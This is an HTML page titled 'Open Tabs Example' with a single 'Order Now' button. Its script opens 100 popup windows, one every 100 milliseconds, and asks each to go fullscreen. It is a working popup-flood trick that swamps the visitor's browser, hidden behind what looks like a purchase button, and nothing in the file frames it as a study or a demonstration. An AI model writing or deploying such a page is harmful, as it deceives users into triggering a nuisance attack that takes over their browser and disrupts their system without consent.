<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Tabs Example</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        button {
            padding: 20px 40px;
            font-size: 24px;
            font-weight: bold;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <button onclick="openPopup()">Order Now</button>

    <script>
        function openPopup() {
            for (let i = 0; i < 100; i++) {
                setTimeout(function() {
                    let newWindow = window.open('popup.html', '_blank', 'width=600,height=400');
                    newWindow.onload = function() {
                        newWindow.document.documentElement.requestFullscreen(); // Request fullscreen for the new window
                    };
                }, i * 100); // 100 ms delay between each tab
            }
        }
    </script>
</body>
</html>
